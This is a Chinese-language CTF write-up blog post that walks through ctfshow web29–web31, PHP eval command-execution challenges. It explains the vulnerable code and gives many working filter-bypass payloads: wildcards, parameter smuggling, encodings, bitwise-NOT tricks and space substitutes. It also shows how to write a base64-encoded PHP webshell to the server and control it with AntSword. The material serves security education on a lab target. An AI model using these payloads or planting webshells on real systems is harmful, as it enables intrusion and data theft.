---
title: "ctfshow-WEB入门（命令执行）"
description: "ctfshow-WEB入门（命令执行）"
image: "/assets/西施2.jpg"
date: 2026-11-05
updated: 2026-11-05
categories:
  - 学习
tags:
  - CTF
  - Web
  - 网络安全
  - 命令执行
type: tech
---

## ctfshow-WEB入门（命令执行）

::link-banner
---
banner: /assets/西施，冰雪.jpg
title: ctfshow-WEB入门（命令执行）
description: 题目来源:ctfshow的WEB入门题
link: "https://ctf.show/challenges"
---
::

### web29

提示：`命令执行，需要严格的过滤`，看到过滤了，那么我们要想到绕过

![image-20261105084924182](/assets/ctfshow-web-command-exec/image-20261105084924182.png)

进入靶场我们能看到php源码

![image-20261105085029503](/assets/ctfshow-web-command-exec/image-20261105085029503.png)

> **接收 URL 里的 `c` 参数 → 检查里面没有 "flag" 这个词 → 把它当 PHP 代码执行。**

防御只有一个词的黑名单，漏洞是 `eval`。

以下是一些代码的解释，不想看的可以跳过：

#### 代码拆解：

##### 第 1 行：关闭报错

```
error_reporting(0);
```

| 词                  | 意思                           |
| :------------------ | :----------------------------- |
| `error_reporting()` | PHP 的「错误报告级别」设置函数 |
| `0`                 | 级别 0 = **什么错误都不显示**  |

代码就算出错了，页面也**一片空白，不报任何错**。所以以后看到白屏，别以为“没执行成功”，很可能是执行了但报错被藏起来了。

##### 第 2 行：有没有传 c 参数？

```
if(isset($_GET['c'])){
```

| 词        | 意思                                                         |
| :-------- | :----------------------------------------------------------- |
| `$_GET`   | PHP 的超全局数组，存放 **URL 问号后面的参数**。访问 `?c=abc`，则 `$_GET['c']` 的值就是 `"abc"` |
| `isset()` | is set，「变量是否已设置」。存在且不为 null 返回 true        |
| `if(...)` | 条件判断，真则进入花括号执行                                 |

**整句**：URL 里带了 `c` 参数吗？带了就走下面；没带就走最后的 `else`。

##### 第 3 行：取出参数

```
$c = $_GET['c'];
```

把 c 参数的值存进变量 `$c`。**从这一行起，`$c` 的内容 由我们控制**——这是“输入点”。

##### 第 4 行：正则黑名单

```
if(!preg_match("/flag/i", $c)){
```

| 部分                       | 意思                                                         |
| :------------------------- | :----------------------------------------------------------- |
| `preg_match(模式, 字符串)` | 正则匹配函数：在字符串里找模式，**找到返回 1，找不到返回 0** |
| `/` ... `/`                | 定界符，正则表达式必须包在两个斜杠之间                       |
| `flag`                     | 要找的字面内容：flag 这四个字母**连着出现**                  |
| 末尾 `i`                   | 修饰符 = **ignore case，不区分大小写**（FLAG、Flag、fLaG 都算命中） |
| `!`                        | 逻辑取反                                                     |

意思是：如果 `$c` 里**没有**出现 "flag"（不分大小写），才执行下一行。

**注意它防了什么、没防什么**：它只挡了 `flag` 这一个词，没有挡 `system`、`cat`、`eval`、引号、空格……这是**黑名单过滤**。

##### 第 5 行：漏洞

```
eval($c);
```

| 词       | 意思                                                        |
| :------- | :---------------------------------------------------------- |
| `eval()` | evaluate，**把字符串当作 PHP 代码执行**。PHP 里最危险的函数 |

`$c` 是我们传的 → 我们能让服务器执行**任意 PHP 代码**，这叫**任意代码执行（RCE 的一种）**。

**两条铁律（新手必踩的坑）**：

1. eval 里的字符串必须是**完整的 PHP 语句，结尾必须有分号 `;`**——少了分号会报错，而报错又被 `error_reporting(0)` 藏了 → 表现为白屏。
2. 它执行的是 **PHP 代码**，不是直接执行 Linux 命令。想跑系统命令，要在里面调 `system("Linux命令")`。

##### 第 6 行：没传参数时给你看源码

```
}else{
    highlight_file(__FILE__);
}
```

| 词                 | 意思                                 |
| :----------------- | :----------------------------------- |
| `highlight_file()` | 把一个文件的源码**语法高亮显示**出来 |
| `__FILE__`         | 魔法常量 = 当前文件自己的完整路径    |

**整句**：你不传 `c`，它就把自己的源码亮给你看——题目主动告诉你“来审计我”。

##### 漏洞链

```
你的输入(?c=...) → $_GET['c'] → $c → eval($c) 任意代码执行
                                          ↓
                              eval 里再调 system() → 任意 Linux 命令执行
```

**解题通用模板**：`?c=system("Linux命令");`——用 eval 执行 PHP 的 system 函数，system 再去执行 Linux 命令。这是“代码执行”升级成“命令执行”。

#### 侦察

```
?c=system("ls");
```

![image-20261105090055467](/assets/ctfshow-web-command-exec/image-20261105090055467.png)

看到目录里有 `flag.php` 和 `index.php`，那么我们读一下flag.php。

接下来有很多解法，都可以试试看：

#### 法1：让 flag 不连着出现-通配符绕过

任选其一

```
?c=system("tac fla*");
?c=system("tac fl?g.php");
?c=system("tac f*");
```

![image-20261105101417211](/assets/ctfshow-web-command-exec/image-20261105101417211.png)

| 符号 | 叫什么          | 意思                                               |
| :--- | :-------------- | :------------------------------------------------- |
| `*`  | 通配符 wildcard | 匹配**任意多个**任意字符，`fla*` 能匹配 `flag.php` |
| `?`  | 通配符          | 匹配**单个**任意字符，`fl?g` 同样能匹配 `flag`     |

**原理**：过滤检查的是你**提交时**的字符串，那时 `fla*` 还不是 `flag`；等服务器上的 Linux shell 执行命令时才把 `*` 展开成真文件名——检查环节根本看不到 "flag" 三个字母连着。

**一些小知识：**

> - **`*` 放在 flag 的开头、中间、结尾都可以，还能同时放多个**。这是 **Linux 服务器上 shell 通配符（globbing）**的行为，位置不限
> - **`*` 不匹配以点 `.` 开头的隐藏文件**，也不会跨越路径分隔符 `/`。如果 flag 文件在别的目录，得写对路径，比如 `tac /tmp/f*`。

##### Q1：为什么大家都用 `tac` 不用 `cat`？

> `flag.php` 的内容以 `<?php` 开头。浏览器看到 `<` 开头的东西会**当成 HTML 标签渲染掉**，所以 `cat` 正序输出时整块被“吃掉”，页面看着是**空白**——其实内容在，**右键查看网页源代码 / F12** 就能看到。
>
> 接下来法2就是cat的解法

#### 法2：换个方式读，不用tac用cat

```
?c=system("cat fla*");     ← 页面空白，要 F12 看源码
?c=system("tac fla*");     ← 直接显示
?c=system("cat fla*.php | tac");   ← cat 输出再倒序，效果同 tac
```

![image-20261105101503448](/assets/ctfshow-web-command-exec/image-20261105101503448.png)

`grep` 版（把 flag 那行滤出来）：

```
?c=system("cat fl*g.php | grep -E 'fl.g'");
```

（`egrep` = `grep -E`；`|` 是管道，把左边命令的输出交给右边命令处理）

![image-20261105101528679](/assets/ctfshow-web-command-exec/image-20261105101528679.png)

##### Q1：-E是·什么意思？

> E 是 Extended（扩展的）的首字母，意思是 “让 grep 按**扩展正则表达式（Extended Regular Expressions，简称 ERE）**来解释模式”
>
> **加不加 -E 的区别：**
>
> - **不加 -E 的普通 grep**：用的是**基础正则（BRE）**。在基础正则里，`?`、`+`、`|`、`{}`、`()` 这些符号默认是**普通字符**，想让它们起特殊作用得加反斜杠，比如 `\?`、`\+`
> - **加了 -E**：这些符号直接就按正则语法生效，不用再写反斜杠，写起来更省事
> - 历史上有个独立命令叫 **egrep**，它就是 `grep -E` 的别名，现在 egrep 已经被标记为过时，官方推荐直接写 `grep -E`
>
> **区分 grep 的另外两个常见选项：**
>
> - `-F`：**Fixed**，把模式当成固定字符串，不做任何正则解释（相当于==纯文本==查找）
> - `-P`：**Perl**，用 Perl 风格的正则，功能更强，支持 `\d`、`\w` 这类写法

##### Q2:为什么gerp是fl.g而不是fl*g?

> 这个 `.` 是正则表达式里的 “任意单个字符”
>
> 这里和前面讲的 shell 通配符是**两套不同的语言**：
>
> - `cat fl*g.php` 这部分在 **shell** 里执行，`*` 是通配符
> - `grep -E 'fl.g'` 这部分在 **grep 的正则表达式（regex）**里执行，`-E` 表示扩展正则。在正则里，**`.`（点）才是 “匹配任意一个字符” 的符号**，所以 `fl.g` 能匹配到 `flag`，点正好代替了字母 a

##### Q3:为什么grep这里用 `.` 而不是 `?`

> **在 grep 正则里，符号的含义和 shell 完全不同：**
>
> - 正则里的 `.` = 任意一个字符（相当于 shell 里的 `?`）
> - 正则里的 `?` = “前面的字符出现 0 次或 1 次”，是个量词，**不是**“任意字符” 的意思
> - 正则里的 `*` = “前面的字符重复 0 次或多次”，也不是 shell 里那个意思
>
> 所以在 grep 里想表达 “fl 后面任意一个字符再 g”，就必须写成 `fl.g`，不能写成 `fl?g`。

###### 看不懂上面的grep内容，可以看下面这些例子：

> 首先要知道**grep正则里的符号分两种角色:**
>
> 角色一：占位符（自己占一个字符的位置）
>
> - 普通字母 `f`、`l`、`g` 都是占位符，而且要求 “必须是我这个字母”
> - **`.` 也是占位符**，但它的要求是 “这个位置随便谁都行”，相当于一个空白格
>
> 角色二：量词（自己不占位置，只修饰它前面的那个字符）
>
> - `?`、`*`、`+` 都是量词，它们像贴在前面字符旁边的备注：
> 	- `?` = 前面这个字符可以出现 **0 次或 1 次**
> 	- `*` = 前面这个字符可以出现 **0 次或很多次**
> 	- `+` = 前面这个字符必须出现 **1 次或更多次**
>
> **`fl.g`（用了点）**
>
> - 读法：f + l + 一个 “任意字符” 的空格 + g，一共 4 个位置
> - 所以 `flag` 能匹配（点的位置填 a），`flbg` 也能匹配（填 b）
>
> **`fl?g`（用了问号）**
>
> - 注意：`?` 贴在 `l` 后面，它是给 `l` 的备注，意思是 “**l 可以不写，最多写一遍**”
> - 读法：f +（l 可有可无）+ g
> - 所以它匹配的是 `fg`（l 没写）和 `flg`（l 写了一遍）
> - `flag` 是 4 个字符，中间那个 a 没有任何位置留给它，所以实测结果是 **False**
>
> **`fl*g`（用了星号）**
>
> - `*` 也是给 `l` 的备注：“l 可以不写，也可以写很多遍”
> - 匹配的是 `fg`、`flg`、`fllg`、`flllg` 这种，同样匹配不到 `flag`

#### 法3：把文件弄到能直接访问的地方

```
?c=system("cp fla*.php a.txt");
```

- `cp` = copy（复制），是 Linux shell 里复制文件的命令。

- 语法是 `cp 源文件 目标文件`：

	- shell 先把 `fla*.php` 展开成真实文件名，比如 `flag.php`

	- 然后把 `flag.php` **复制一份**，命名为 `a.txt`，原文件 `flag.php` 还在，不会被删

然后浏览器直接访问 `https://靶机/a.txt` ——拷贝改后缀，绕开一切渲染问题。

![image-20261105115041091](/assets/ctfshow-web-command-exec/image-20261105115041091.png)

![image-20261105115110837](/assets/ctfshow-web-command-exec/image-20261105115110837.png)

#### 法4：参数转移

`preg_match` **只检查了 c 这一个参数**！把真正的命令放到另一个参数里：

```
?c=eval($_GET[1]);&1=system("tac flag.php");
```

c 的值是 `eval($_GET[1]);`——里面没有 flag；命令藏在**第二个参数 `1`** 里，eval 执行时才取出来。

![image-20261105115143448](/assets/ctfshow-web-command-exec/image-20261105115143448.png)

**include + PHP 伪协议版**(读文件专用，连括号都不用)：

```
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20261105115219447](/assets/ctfshow-web-command-exec/image-20261105115219447.png)

![image-20261105115257629](/assets/ctfshow-web-command-exec/image-20261105115257629.png)

- `include` 是语言构造不是函数，可以不写括号
- `php://filter/read=convert.base64-encode/resource=flag.php` = 把 flag.php 的**源码** base64 编码后输出（避免 `<?php` 被浏览器吃掉的问题）
- 出来一串 base64，拿 CyberChef（`Toolkit\Web\CyberChef`）解码就得到 flag
- `?>` 是提前结束 PHP 语句的写法（include 那句后面不用分号）

**Q1： `include$_GET[1]?>` 里的 `?>` 是什么？为什么不用分号？**

> **`?>` 是 PHP 的结束标记（closing tag）。**
>
> URL它其实是两个参数：
>
> ```
> ?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
> └────── c 的值 ──────┘ └───────────── 参数 1 的值 ─────────────┘
> ```
>
> - 参数 **c** 的值 = `include$_GET[1]?>`
> - 参数 **1** 的值 = `php://filter/read=convert.base64-encode/resource=flag.php`
>
> eval 实际执行的 PHP 代码是：
>
> ```
> include$_GET[1]?>
> ```
>
> | 部分       | 意思                                                         |
> | :--------- | :----------------------------------------------------------- |
> | `include`  | PHP「包含」语句，把指定文件内容拿进来。**语句不是函数，所以可以不写括号** |
> | `$_GET[1]` | 取 URL 里名为 `1` 的参数 → 那串 `php://filter/...`           |
> | `?>`       | PHP 结束标记                                                 |
>
> **为什么能代替分号**：PHP 的语法规则是——每条语句结尾，**要么写分号 `;`，要么用 `?>` 收尾**。`?>` 自带「结束当前语句」的效果，所以这两种写法等价：
>
> ```
> include $_GET[1];    // 分号收尾
> include $_GET[1]?>   // ?> 收尾，不用分号
> ```

**Q2：为什么用 `?>` 而不用 `;`？**

> 这条 payload 塞在 URL 查询字符串里，而 PHP 的 `arg_separator.input` 默认把 `;` 也当作参数==分隔符==（作用等同 `&`）。写 `?c=include$_GET[1];&1=...` 时那个 `;` 可能把参数截断。用 `?>` 绕开这个坑，顺便替了分号的作用。
>
> **反证**：如果既不分号也不写 `?>` → `include$_GET[1]` 语句没结束 → PHP 语法报错 → 报错被 `error_reporting(0)` 藏了 → 页面空白。

#### 法5：编码绕过

```
?c=system(base64_decode('dGFjIGZsYSo='));
```

![image-20261105115333631](/assets/ctfshow-web-command-exec/image-20261105115333631.png)

`dGFjIGZsYSo=` 解码就是 `tac fla*`。检查时 c 里只有一串看不懂的 base64，运行时才解码——和法1同理：**让敏感词在“检查的时候”不存在**。

#### 法6：PHP 函数流，不使用linux命令

```
?c=highlight_file(next(array_reverse(scandir("."))));
```

![image-20261105115354147](/assets/ctfshow-web-command-exec/image-20261105115354147.png)

从里往外读：

1.`scandir(".")` —— 列出当前目录所有文件 → `['.', '..', 'flag.php', 'index.php']`

2.`array_reverse(...)` —— 数组倒过来 → `['index.php', 'flag.php', '..', '.']`

3.`next(...)` —— 把数组指针后移一位，从 index.php 移到 **flag.php**

4.`highlight_file(...)` —— 高亮显示它的源码

与`highlight_file(base64_decode("ZmxhZy5waHA="))` 是同思想（`ZmxhZy5waHA=` 解码 = flag.php）。

#### 法7：写一句话木马 + 蚁剑

打开**中国蚁剑**（`cd /d C:\HelloCTF\Toolkit\Web\AntSword-Loader-v4.0.3-win32-x64
AntSword.exe`）

![image-20261105125226271](/assets/ctfshow-web-command-exec/image-20261105125226271.png)

##### 在靶机上写入一句话木马

浏览器地址栏直接访问（URL 安全版，不含 `<` `?` 这些会被浏览器吃掉的字符）：

```
<URL>?c=file_put_contents('shell.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=='));
```

![image-20261105185540035](/assets/ctfshow-web-command-exec/image-20261105185540035.png)

base64前原来的木马

```
?c=file_put_contents('shell.php','<?php eval($_POST[1]);?>');
```

> `PD9waHAg...` 解码就是 `<?php @eval($_POST[1]);?>`，也就是一句话木马。`@` 用来压制报错。页面**没反应/空白是正常的**（`error_reporting(0)` 关掉了回显）。

**验证是否写成功**：再访问

```
https://....challenge.ctf.show/shell.php
```

![image-20261105185604958](/assets/ctfshow-web-command-exec/image-20261105185604958.png)

- 页面空白（不报 404）→ 木马已写入
- 显示 404 → 没写成功，回去检查 payload 有没有粘全

##### 在蚁剑里添加 shell

左侧空白界面里右键，点击`添加数据`

![image-20261105172154200](/assets/ctfshow-web-command-exec/image-20261105172154200.png)



![image-20261105172214651](/assets/ctfshow-web-command-exec/image-20261105172214651.png)

弹窗里填：

| 选项              | 填什么                                                       |
| :---------------- | :----------------------------------------------------------- |
| **URL 地址**      | `http://70a5c459-...challenge.ctf.show/shell.php`（==去掉https的s==） |
| **连接密码**      | `1`                                                          |
| 编码器 / 编码设置 | 默认（default）                                              |
| 类型              | PHP（一般会自动识别）                                        |

1.点「测试连接」：

- 显示类似「成功 / 返回数据正常」→ 点「添加」保存
- 显示失败 → 看下面「连不上怎么办」

2.回到主界面，**双击**刚添加的那条记录，就进入文件管理了。

![image-20261105190757398](/assets/ctfshow-web-command-exec/image-20261105190757398.png)

##### 找 flag

进去后默认打开**文件管理**，左边是目录树：

1.定位到网站根目录（就是你 shell.php 所在目录）

2.找到 `flag.php` → 右键「打开」/「编辑」直接看内容

3.里面就是 `ctfshow{...}`

![image-20261105190829059](/assets/ctfshow-web-command-exec/image-20261105190829059.png)

另外也可以用上方的 **「虚拟终端」**（有的版本叫「终端」），直接敲：

```
ls
cat flag.php
```

![image-20261105191209968](/assets/ctfshow-web-command-exec/image-20261105191209968.png)

![image-20261105191316303](/assets/ctfshow-web-command-exec/image-20261105191316303.png)

效果和你在网页里 `?c=system("cat fla*");` 一样，但能交互式执行任意命令。

连接 `https://靶机/shell.php`，密码 `1`，图形化界面里翻文件就像操作自己的电脑。也可以不写内容直接 `eval($_POST[1])` 连当前页。

#### 法8：反引号内联执行

```
?c=echo `tac fla*`;
```

反引号（键盘左上角、和 `~` 同一个键）在 PHP 里等价于 `shell_exec()`，执行命令并返回结果。

![image-20261105122908755](/assets/ctfshow-web-command-exec/image-20261105122908755.png)

##### Q1：

```
?c=echo `tac fla*`;
```

里``是什么意思，有什么用？

> 这两个符号叫**反引号**，在 shell 里它表示命令替换。这是 **Linux shell** 的语法，运行在远程靶机上。
>
> 它的作用：先执行里面的命令，再把结果替换出来
>
> **shell 看到反引号后，会做两件事：**
>
> 1.先把反引号**里面的命令执行一遍**
>
> 2.再把整段反引号（包括两个 ` 符号）替换成那条命令的**输出结果**，然后才执行外面的命令
>
> 所以这条命令：
>
> ```
> echo `tac fla*`
> ```
>
> 执行过程是：
>
> 1.shell 先跑 `tac fla*`，得到 flag 文件的内容（比如 `flag{xxxx}`）
>
> 2.命令就变成了 `echo flag{xxxx}`
>
> 3.echo 再把这段内容打印出来，你就看到了 flag

##### Q2：?c=echo `tac fla*`;里加不加``有什么区别？

> - `echo tac fla*`（没有反引号）：echo 只会把 `tac` 和文件名当**普通文字**打印出来，tac 根本不执行
>
> - ```
> 	echo `tac fla*`;
> 	```
>
> 	（有反引号）：tac 会被**执行**，echo 打印的是 tac 读出来的内容
>
> 反引号是老式语法，现在 shell 更推荐用 **`$( )`**，效果是一样的：
>
> ```
> echo $(tac fla*)
> ```
>
> `$( )` 的好处是可以层层嵌套（命令里再套命令），如果使用反引号，嵌套时要写一堆转义符，会比较麻烦。

##### 区分这三种引号：

> - 反引号 `：执行里面的命令并替换成输出
> - 单引号 '：里面的内容原样保留，不做任何执行和替换
> - 双引号 "：里面允许变量和命令替换生效

### web30

![image-20261105194121470](/assets/ctfshow-web-command-exec/image-20261105194121470.png)

php代码的意思是传参c里不能出现flag，system，php。无论大小写。

#### web29在这里复用的方法

| 方法           | payload                                                      | 说明                                   |
| :------------- | :----------------------------------------------------------- | :------------------------------------- |
| 通配符         | `?c=passthru("tac fla*");`                                   | `*` 匹配任意长度                       |
| 单字符通配     | `?c=passthru("tac fla?????");`                               | `?` 匹配单个字符(fla+5个=8位=flag.php) |
| **一石二鸟了** | `?c=passthru("tac f*");`                                     | `f*` 同时避开 flag 和 php 两个词       |
| 参数转移       | `?c=eval($_GET[1]);&1=system("tac flag.php");`               | c 里干净，命令执行放参数 1             |
| 伪协议         | `?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php` | 输出 base64 再解码                     |
| 拷走           | `?c=passthru("cp fla*.ph* 2.txt");` 再访问 `/2.txt`          | 用通配符绕 php                         |
| 蚁剑           | 写木马后连                                                   | 需要容器活着                           |

#### 下面是一些其他新增的解法：

##### 1.换命令执行函数(替代 system)

PHP 里能执行系统命令的函数有一大把，system 只是最常用的那个：

| 函数           | 写法                              | 回显特点                               |
| :------------- | :-------------------------------- | :------------------------------------- |
| `system()`     | 被挡                              | 直接输出全部结果                       |
| `passthru()`   | `?c=passthru("tac fla*");`        | 直接输出(二进制也安全)                 |
| `shell_exec()` | `?c=echo shell_exec("tac fla*");` | **返回**字符串，**必须 echo 才看得到** |
| `exec()`       | `?c=echo exec("tac fla*");`       | 只返回**最后一行**，必须 echo          |
| 反引号         | `?c=echo `tac fla*`;`             | 等价 `shell_exec`，最省事              |

##### 2.动态函数调用(可变函数)

PHP 有个特性：**变量后面加括号，如果变量的值是函数名字符串，就调用那个函数**。这叫「可变函数(variable function)」。

```
?c=$a='sys';$b='tem';$d=$a.$b;$d('tac fl*');
```

逐步看：

- `$a='sys';` → 变量 a 存了 `sys`
- `$b='tem';` → 变量 b 存了 `tem`
- `$d=$a.$b;` → 拼接成 `system`（`.` 在 PHP 里是字符串连接符）
- `$d('tac fl*');` → 变量 d 的值是 "system"，于是**调用 system** 执行命令

**为什么能过正则？** 因为我们提交的字符串里，`sys` 和 `tem` 是两个分开的字符串，从头到尾没有出现过连续的 `system` 七个字母。正则检查的是"字面文本"，而函数名是**运行时才拼出来**的，这是「检查时刻 vs 使用时刻」的时间差。

> 同类变体：`call_user_func('passthru','ls')`、用 `chr()` 拼函数名、`strrev('metsys')`（倒序）。

##### 3.shell 层拼文件名(反斜杠 / 引号)

这两个技巧**必须在命令执行函数里用**（因为要靠 Linux shell 解析）：

**反斜杠转义**：

```
?c=passthru("cat f\lag.p\hp");
```

- PHP 收到的字符串是 `cat f\lag.p\hp`——正则找 `flag` 找不到（中间隔着 `\`），找 `php` 也找不到
- 命令交给 Linux shell 后，shell 把 `\l` 解释为"转义 l"，去掉反斜杠 → 实际执行 `cat flag.php`

**引号拼接**：

```
?c=passthru("cat fl''ag.p''hp");
```

- 提交的字符串是 `fl''ag.p''hp`，同样没有连写的 flag/php
- shell 里**相邻的字符串会自动拼接**：`fl` + `ag` = `flag`，`p` + `hp` = `php`

> 这就是常说的「**双层解析**」：PHP 层先过正则，shell 层再做真正的解析。你写的东西在两层里"看起来不一样"，绕过就发生了。

##### 4.PHP 层拼字符串(chr / base64 / 连接符)

不靠 shell，直接在 PHP 里把文件名拼出来：

```
?c=readfile('fl'.'ag'.chr(46).chr(112).chr(104).chr(112));
```

- PHP 的 `.` 连接字符串：`'fl'.'ag'` = `flag`
- `chr(46)` = `.`，`chr(112)` = `p`，`chr(104)` = `h`，`chr(112)` = `p` → 拼出 `.php`
- `readfile()` 直接把文件内容输出到页面

base64 版（web29 也用过）：

```
?c=passthru(base64_decode('Y2F0IGZsYWcucGhw'));
```

（`Y2F0IGZsYWcucGhw` 解码 = `cat flag.php`）

##### 5.纯 PHP 读文件(用不到系统命令)

```
?c=show_source(scandir('.')[2]);
```

拆开看：

- `scandir('.')` → 列出当前目录，返回数组 `['.', '..', 'flag.php', 'index.php']`（按字母序）
- `[2]` → 取**下标 2** 的元素，正好是 `flag.php`
- `show_source()` → 高亮显示该文件源码（PHP 函数，不是 shell 命令）

整个 payload 里没有 flag、没有 system、没有 php 三个词。类似的还有：

| 函数                  | 作用                             |
| :-------------------- | :------------------------------- |
| `highlight_file()`    | 高亮输出文件源码（复用自 web29） |
| `show_source()`       | 同上，是别名                     |
| `readfile()`          | 直接输出文件内容                 |
| `file_get_contents()` | 读成字符串，需要 echo            |

### web31

![image-20261105210331377](/assets/ctfshow-web-command-exec/image-20261105210331377.png)

```
"/flag|system|php|cat|sort|shell|\.| |\'/i"
```

- 两个 `/` 是正则的边界符
- `|` 表示 “或者”，所以每一段都是一个独立的禁词
- `\.` 里的反斜杠是转义，意思是 “**字面意义的点**”（不转义的点在正则里是任意字符）
- ` ` 单独一个空格，就是禁止空格
- `\'` 表示**单引号**
- 结尾的 `/i` 是大小写不敏感，所以 `FLAG`、`Php`、`Cat` 这种大写也一样拦

**提交的 c 参数里，不能出现下面的任何一个：**

flag，system，php，cat，sort，shell，.（点），空格，单引号 `'`

#### 之前题目复用的方法

| 方法                                     | 在 web31 的写法                                | 备注                                 |
| :--------------------------------------- | :--------------------------------------------- | :----------------------------------- |
| **通配符**                               | `fla*`、`f*`、`fla?????`                       | `f*` 同时绕 flag 和 php              |
| **参数转移 / eval 嵌套**                 | `?c=eval($_GET[1]);&1=system("tac flag.php");` | **万能钥匙**，因为 preg_match 只查 c |
| **passthru 换 system**                   | `?c=passthru("ls");`                           | web30说过了，继续用                  |
| **反引号执行**                           | ?c=echo`tac%09fla*`;                           | shell 二字被挡但反引号本身没被挡     |
| **show_source/highlight_file + scandir** | `show_source(scandir(getcwd())[2])`            | 思路一样，但 `.` 要换写法(见下)      |
| **base64_decode**                        | `?c=passthru(base64_decode("..."));`           | base64 串本身安全，但包裹要用双引号  |

**在 web31 失效了（web30 能用，这里不能）**

| 方法                                          | 为什么失效          | 替代                                      |
| :-------------------------------------------- | :------------------ | :---------------------------------------- |
| PHP 点号拼接 `'fl'.'ag'`、`$a.$b` 拼 `system` | **`.` 被挡**        | 用 `chr()` 拼、`"\xHH"`、参数转移         |
| 单引号字符串 `'ls'`                           | **`'` 被挡**        | 改用双引号 `"ls"`                         |
| `php://filter` 伪协议                         | 含 **php** 三个字母 | 用 getcwd/glob 读文件                     |
| `cp flag.php a.txt` 落地                      | 文件名有**点**      | `cp fla* 1`（无扩展名），或 `cp fla*%09a` |
| `shell_exec()`                                | 含 **shell**        | 反引号 / passthru                         |
| `system()`                                    | 含 **system**       | passthru / exec / 反引号                  |

**本次新学的（一共 5 组）内容是：**

1. 空格替代：`%09`(Tab)、`${IFS}`
2. 读文件命令替代：`tac`、`nl`、`tail`、`head`
3. 点号替代：`getcwd()`、`pos(localeconv())`、`chr(46)`
4. 字符串构造升级：十六进制转义 `"\x66\x6c..."`、`glob()`
5. 进阶：取反 `~` 绕过

#### 这三条比较常用，记这三条：

`passthru("tac%09fla*")`、`eval($_GET[1])` 嵌套、`show_source(scandir(getcwd())[2])`。

#### 一些新的方法：

##### 1.空格被挡可以使用`%09` 或 `${IFS}`

`%09` 是 **Tab（制表符）** 的 URL 编码。Linux shell 把 Tab 和空格一样当"分隔符"，而正则匹配的是字面空格字符，Tab 不是空格，所以能够绕过。

```
?c=passthru("tac%09fla*");
```

其他等价写法：

| 写法                         | 原理                                                |
| :--------------------------- | :-------------------------------------------------- |
| `%09`                        | Tab，最常用                                         |
| `$IFS` / `${IFS}` / `$IFS$9` | IFS 是 shell 的内置变量，值默认是「空格+Tab+换行」  |
| `%20`                        | URL编码，这个**不行**，它解码出来就是空格，正好被挡 |

**容易踩坑的地方**：双引号字符串里 `$` 会被 PHP 当成变量插值。写 `"tac${IFS}fla*"` 时 PHP 会把 `${IFS}` 替换成空值，命令变成 `tacfla*` 就错了。所以要**反斜杠转义**：

```
?c=passthru("tac\${IFS}fla*");
```

##### 2.cat/sort 被挡，那么换成-读文件命令

| 原命令 | 替代                                                      |
| :----- | :-------------------------------------------------------- |
| `cat`  | `tac`(倒序)、`nl`(带行号)、`tail`、`head`、`more`、`less` |

任何一条都行，`tac`（web29已经说过了）。

##### 3.shell 被挡，shell_exec 不可以，反引号可以

`shell_exec("cmd")` 含 `shell`，直接被挡。但反引号 ``cmd`` 是它语法层面的等价物，没有任何被挡的字面：

```
?c=echo`tac%09fla*`;
```

##### 4.点号被挡，有三种拿"当前目录"的办法

原来大家爱写 `scandir(".")`，现在 `.` 不能出现。三个替代：

**(1) `getcwd()`**

```
?c=show_source(scandir(getcwd())[2]);
```

`getcwd()` 返回当前工作目录路径（字符串），不需要点号。

**(2)`pos(localeconv())`**

```
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
```

- `localeconv()` 返回本地化信息数组，**第一个元素就是小数点 `"."`**
- `pos()` = `current()`，取数组当前第一个元素 → 得到 `"."`

**(3)`chr(46)` / `"\x2e"`**

```
?c=show_source(scandir(chr(46))[2]);
```

`chr(46)` 就是 `.` 的 ASCII 码，字面上不含点。

##### 5.十六进制转义（构造文件名）

PHP 双引号字符串支持 `\xHH` 转义：

```
?c=readfile("\x66\x6c\x61\x67\x2e\x70\x68\x70");
```

`\x66\x6c\x61\x67` = `flag`，`\x2e` = `.`，`\x70\x68\x70` = `php` → 拼成 `flag.php`。payload 里没有 flag/php/点的字面。

##### 6.`glob()` 直接找文件

```
?c=$f=glob("f*");show_source($f[0]);
```

`glob("f*")` 返回匹配的文件路径数组 `['flag.php']`，`$f[0]` 取第一个，`show_source` 读它。不用写flag、不写 php、不写点。

##### 7.取反 `~` 绕过（了解即可）

```
?c=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);
```

原理：把 `system` 和 `cat flag.php` 每个字符取按位取反(`~`)，得到一堆高位字节，URL 编码后提交。正则里当然没有这些乱码，运行时 PHP 再 `~` 一次还原成明文。

##### 8.命令替换 `$(...)`（不写文件名的思路）

```
?c=echo`tac $(ls -1 | head -n 1)`;
```

`ls -1 | head -n 1` 动态拿到第一个文件名，再交给 tac。好处是**完全不用写文件名**。但注意：必须有反引号（让整串作为命令执行）。
